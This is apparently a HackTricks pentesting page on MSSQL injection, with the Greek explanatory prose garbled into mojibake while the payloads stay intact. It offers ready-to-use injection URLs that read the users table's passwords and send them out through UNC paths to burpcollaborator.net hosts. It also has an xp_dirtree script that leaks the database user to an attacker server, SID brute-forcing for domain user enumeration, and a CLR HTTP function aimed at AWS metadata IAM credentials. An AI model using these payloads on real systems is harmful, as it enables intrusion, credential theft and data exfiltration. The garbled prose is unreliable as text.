# MSSQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Active Directory enumeration

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± **ÎºÎ±Ï„Î±Î¼ÎµÏ„ÏÎ®ÏƒÎµÏ„Îµ Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï„Î¿Ï… Ï„Î¿Î¼Î­Î± Î¼Î­ÏƒÏ‰ SQL injection Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î±Î½ MSSQL** Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ MSSQL ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚:

* **`SELECT DEFAULT_DOMAIN()`**: Î›Î¬Î²ÎµÏ„Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï„ÏÎ­Ï‡Î¿Î½Ï„Î¿Ï‚ Ï„Î¿Î¼Î­Î±.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: Î•Î¬Î½ Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Ï„Î¿Î¼Î­Î± (_DOMAIN_ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±) Î±Ï…Ï„Î® Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Ï„Î¿ **SID Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Administrator** ÏƒÎµ Î¼Î¿ÏÏ†Î® hex. Î‘Ï…Ï„ÏŒ Î¸Î± Î¼Î¿Î¹Î¬Î¶ÎµÎ¹ Î¼Îµ `0x01050000000[...]0000f401`, ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ Ï€ÏÏ‚ Ï„Î± **Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± 4 bytes** ÎµÎ¯Î½Î±Î¹ Î¿ Î±ÏÎ¹Î¸Î¼ÏŒÏ‚ **500** ÏƒÎµ **big endian** Î¼Î¿ÏÏ†Î®, Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Ï„Î¿ **ÎºÎ¿Î¹Î½ÏŒ ID Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· administrator**.\
Î‘Ï…Ï„Î® Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î¸Î± ÏƒÎ±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ Î½Î± **Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï„Î¿ ID Ï„Î¿Ï… Ï„Î¿Î¼Î­Î±** (ÏŒÎ»Î± Ï„Î± bytes ÎµÎºÏ„ÏŒÏ‚ Î±Ï€ÏŒ Ï„Î± Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± 4).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Î‘Ï…Ï„Î® Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· Î¸Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ Ï„Î¿ **ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î· Ï„Î¿Ï… Ï…Ï€Î¿Î´ÎµÎ¹ÎºÎ½Ï…ÏŒÎ¼ÎµÎ½Î¿Ï… ID** (Î±Î½ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹), ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· **0000e803** ÏƒÎµ big endian == **1000** (ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ ID Ï„Î¿Ï… Ï€ÏÏÏ„Î¿Ï… ÎºÎ±Î½Î¿Î½Î¹ÎºÎ¿Ï Ï‡ÏÎ®ÏƒÏ„Î· Ï€Î¿Ï… Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ). Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï†Î±Î½Ï„Î±ÏƒÏ„ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ brute-force Ï„Î± IDs Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Î±Ï€ÏŒ 1000 Î­Ï‰Ï‚ 2000 ÎºÎ±Î¹ Ï€Î¹Î¸Î±Î½ÏÏ‚ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ ÏŒÎ»Î± Ï„Î± Î¿Î½ÏŒÎ¼Î±Ï„Î± Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ Ï„Î¿Ï… Ï„Î¿Î¼Î­Î±. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î¼Î¹Î± ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÏŒÏ€Ï‰Ï‚ Î· Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Î•Î½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ¿Î¯ Î£Ï†Î¬Î»Î¼Î±Ï„Î±-Î’Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿Î¹ Î”ÎµÎ¯ÎºÏ„ÎµÏ‚**

ÎŸÎ¹ SQL injections Ï€Î¿Ï… Î²Î±ÏƒÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÎµ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î± ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¼Î¿Î¹Î¬Î¶Î¿Ï…Î½ Î¼Îµ ÎºÎ±Ï„Î±ÏƒÎºÎµÏ…Î­Ï‚ ÏŒÏ€Ï‰Ï‚ `+AND+1=@@version--` ÎºÎ±Î¹ Ï€Î±ÏÎ±Î»Î»Î±Î³Î­Ï‚ Ï€Î¿Ï… Î²Î±ÏƒÎ¯Î¶Î¿Î½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ Â«ORÂ» Ï„ÎµÎ»ÎµÏƒÏ„Î®. Î¤Î± ÎµÏÏ‰Ï„Î®Î¼Î±Ï„Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ Ï„Î­Ï„Î¿Î¹ÎµÏ‚ ÎµÎºÏ†ÏÎ¬ÏƒÎµÎ¹Ï‚ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î±Ï€Î¿ÎºÎ»ÎµÎ¯Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î± WAFs. Î©Ï‚ Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ·, ÏƒÏ…Î½Î´Ï…Î¬ÏƒÏ„Îµ Î¼Î¹Î± ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÎ¬ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿Î½ Ï‡Î±ÏÎ±ÎºÏ„Î®ÏÎ± %2b Î¼Îµ Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Ï‰Î½ ÎºÎ»Î®ÏƒÎµÏ‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½ Ï€Î¿Ï… Ï€ÏÎ¿ÎºÎ±Î»Î¿ÏÎ½ ÏƒÏ†Î¬Î»Î¼Î± Î¼ÎµÏ„Î±Ï„ÏÎ¿Ï€Î®Ï‚ Ï„ÏÏ€Î¿Ï… Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏ„Î± ÎµÏ€Î¹Î¸Ï…Î¼Î·Ï„Î¬ Î´ÎµÎ´Î¿Î¼Î­Î½Î±.

ÎŸÏÎ¹ÏƒÎ¼Î­Î½Î± Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î± Ï„Î­Ï„Î¿Î¹Ï‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï‡ÏÎ®ÏƒÎ·Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ `USER_NAME()`:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ SSRF [Î»Î®Ï†Î¸Î·ÎºÎ±Î½ Î±Ï€ÏŒ ÎµÎ´Ï](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

Î‘Ï€Î±Î¹Ï„ÎµÎ¯ Î¬Î´ÎµÎ¹Î± **`VIEW SERVER STATE`** ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

Î‘Ï€Î±Î¹Ï„ÎµÎ¯ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`CONTROL SERVER`**.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

Î‘Ï€Î±Î¹Ï„ÎµÎ¯ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`CONTROL SERVER`**.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

ÎŸÎ¹ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½ÎµÏ‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `xp_dirtree`, Î±Î½ ÎºÎ±Î¹ Î´ÎµÎ½ Ï„ÎµÎºÎ¼Î·ÏÎ¹ÏÎ½Î¿Î½Ï„Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Î¼Î± Î±Ï€ÏŒ Ï„Î· Microsoft, Î­Ï‡Î¿Ï…Î½ Ï€ÎµÏÎ¹Î³ÏÎ±Ï†ÎµÎ¯ Î±Ï€ÏŒ Î¬Î»Î»Î¿Ï…Ï‚ Î´Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÎ¬ Î»ÏŒÎ³Ï‰ Ï„Î·Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î¬Ï‚ Ï„Î¿Ï…Ï‚ ÏƒÎµ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯ÎµÏ‚ Î´Î¹ÎºÏ„ÏÎ¿Ï… ÎµÎ½Ï„ÏŒÏ‚ Ï„Î¿Ï… MSSQL. Î‘Ï…Ï„Î­Ï‚ Î¿Î¹ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ…Ï‡Î½Î¬ ÏƒÎµ ÎµÎ¾Î±Î³Ï‰Î³Î® Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÎµÎºÏ„ÏŒÏ‚ Î¶ÏÎ½Î·Ï‚, ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏƒÎµ Î´Î¹Î¬Ï†Î¿ÏÎ± [Ï€Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î±](https://www.notsosecure.com/oob-exploitation-cheatsheet/) ÎºÎ±Î¹ [Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏÏƒÎµÎ¹Ï‚](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/).

Î— Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± `xp_dirtree`, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± ÎºÎ¬Î½ÎµÎ¹ Î±Î¹Ï„Î®Î¼Î±Ï„Î± Î´Î¹ÎºÏ„ÏÎ¿Ï…, Î±Î»Î»Î¬ Ï€ÎµÏÎ¹Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î¼ÏŒÎ½Î¿ ÏƒÏ„Î·Î½ TCP Î¸ÏÏÎ± 445. ÎŸ Î±ÏÎ¹Î¸Î¼ÏŒÏ‚ Ï„Î·Ï‚ Î¸ÏÏÎ±Ï‚ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎ¹Î¼Î¿Ï‚, Î±Î»Î»Î¬ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· Î±Ï€ÏŒ ÎºÎ¿Î¹Î½Î­Ï‚ Ï‡ÏÎ®ÏƒÎµÎ¹Ï‚ Î´Î¹ÎºÏ„ÏÎ¿Ï…. Î— Ï‡ÏÎ®ÏƒÎ· Ï„Î·Ï‚ Î±Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎµÏ„Î±Î¹ ÏƒÏ„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ SQL script:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
Î•Î¯Î½Î±Î¹ Î±Î¾Î¹Î¿ÏƒÎ·Î¼ÎµÎ¯Ï‰Ï„Î¿ ÏŒÏ„Î¹ Î±Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼Î·Î½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ ÏƒÎµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î¿Ï‚, ÏŒÏ€Ï‰Ï‚ ÏƒÎµ `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` Ï€Î¿Ï… Ï„ÏÎ­Ï‡ÎµÎ¹ ÏƒÎµ `Windows Server 2016 Datacenter` Î¼Îµ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½ÎµÏ‚ ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹Ï‚.

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ ÎµÎ½Î±Î»Î»Î±ÎºÏ„Î¹ÎºÎ­Ï‚ Î±Ï€Î¿Î¸Î·ÎºÎµÏ…Î¼Î­Î½ÎµÏ‚ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ `master..xp_fileexist` ÎºÎ±Î¹ `xp_subdirs` Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÏ€Î¹Ï„ÏÏ‡Î¿Ï…Î½ Ï€Î±ÏÏŒÎ¼Î¿Î¹Î± Î±Ï€Î¿Ï„ÎµÎ»Î­ÏƒÎ¼Î±Ï„Î±. Î ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ `xp_fileexist` Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î²ÏÎµÎ¸Î¿ÏÎ½ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ [TechNet Î¬ÏÎ¸ÏÎ¿](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx).

### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

Î ÏÎ¿Ï†Î±Î½ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ **`xp_cmdshell`** Î³Î¹Î± Î½Î± **ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ** ÎºÎ¬Ï„Î¹ Ï€Î¿Ï… ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼Î¹Î± **SSRF**. Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ **Î´Î¹Î±Î²Î¬ÏƒÏ„Îµ Ï„Î·Î½ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ® ÎµÎ½ÏŒÏ„Î·Ï„Î±** ÏƒÏ„Î· ÏƒÎµÎ»Î¯Î´Î±:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Î— Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± Î¼Î¹Î±Ï‚ CLR UDF (Common Language Runtime User Defined Function), Î· Î¿Ï€Î¿Î¯Î± ÎµÎ¯Î½Î±Î¹ ÎºÏÎ´Î¹ÎºÎ±Ï‚ Ï€Î¿Ï… Î­Ï‡ÎµÎ¹ ÏƒÏ…Î³Î³ÏÎ±Ï†ÎµÎ¯ ÏƒÎµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î³Î»ÏÏƒÏƒÎ± .NET ÎºÎ±Î¹ Î­Ï‡ÎµÎ¹ Î¼ÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¹ÏƒÏ„ÎµÎ¯ ÏƒÎµ DLL, Î³Î¹Î± Î½Î± Ï†Î¿ÏÏ„Ï‰Î¸ÎµÎ¯ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ MSSQL Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Ï‰Î½ ÏƒÏ…Î½Î±ÏÏ„Î®ÏƒÎµÏ‰Î½, ÎµÎ¯Î½Î±Î¹ Î¼Î¹Î± Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· `dbo`. Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÎµÏ†Î¹ÎºÏ„ÏŒ Î¼ÏŒÎ½Î¿ ÏŒÏ„Î±Î½ Î· ÏƒÏÎ½Î´ÎµÏƒÎ· ÏƒÏ„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î³Î¯Î½ÎµÏ„Î±Î¹ Ï‰Ï‚ `sa` Î® Î¼Îµ ÏÏŒÎ»Î¿ Î”Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î®.

ÎˆÎ½Î± Î­ÏÎ³Î¿ Visual Studio ÎºÎ±Î¹ Î¿Î´Î·Î³Î¯ÎµÏ‚ ÎµÎ³ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Î¹ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ [Github Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿](https://github.com/infiniteloopltd/SQLHttp) Î³Î¹Î± Î½Î± Î´Î¹ÎµÏ…ÎºÎ¿Î»ÏÎ½Î¿Ï…Î½ Ï„Î· Ï†ÏŒÏÏ„Ï‰ÏƒÎ· Ï„Î¿Ï… Î´Ï…Î±Î´Î¹ÎºÎ¿Ï Î±ÏÏ‡ÎµÎ¯Î¿Ï… ÏƒÏ„Î¿ MSSQL Ï‰Ï‚ CLR assembly, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Î­Ï„ÏƒÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· HTTP GET Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½ Î±Ï€ÏŒ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ MSSQL.

Î— Î¿Ï…ÏƒÎ¯Î± Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î±Ï‚ ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î· ÏƒÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `http.cs`, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î·Î½ ÎºÎ»Î¬ÏƒÎ· `WebClient` Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹ Î­Î½Î± GET Î±Î¯Ï„Î·Î¼Î± ÎºÎ±Î¹ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÎ¹ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ ÏŒÏ€Ï‰Ï‚ Î±Ï€ÎµÎ¹ÎºÎ¿Î½Î¯Î¶ÎµÏ„Î±Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
Î ÏÎ¹Î½ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® SQL `CREATE ASSEMBLY`, ÏƒÏ…Î½Î¹ÏƒÏ„Î¬Ï„Î±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ SQL snippet Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Ï„Î¿ SHA512 hash Ï„Î·Ï‚ assembly ÏƒÏ„Î· Î»Î¯ÏƒÏ„Î± Ï„Ï‰Î½ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Ï‰Î½ assemblies Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® (Î¿ÏÎ±Ï„ÏŒ Î¼Î­ÏƒÏ‰ `select * from sys.trusted_assemblies;`):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
ÎœÎµÏ„Î¬ Ï„Î·Î½ ÎµÏ€Î¹Ï„Ï…Ï‡Î¯Î± Ï€ÏÎ¿ÏƒÎ¸Î®ÎºÎ·Ï‚ Ï„Î·Ï‚ Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ·Ï‚ ÎºÎ±Î¹ Ï„Î·Ï‚ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î±Ï‚ Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚, Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ SQL ÎºÏÎ´Î¹ÎºÎ±Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· HTTP Î±Î¹Ï„Î·Î¼Î¬Ï„Ï‰Î½:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
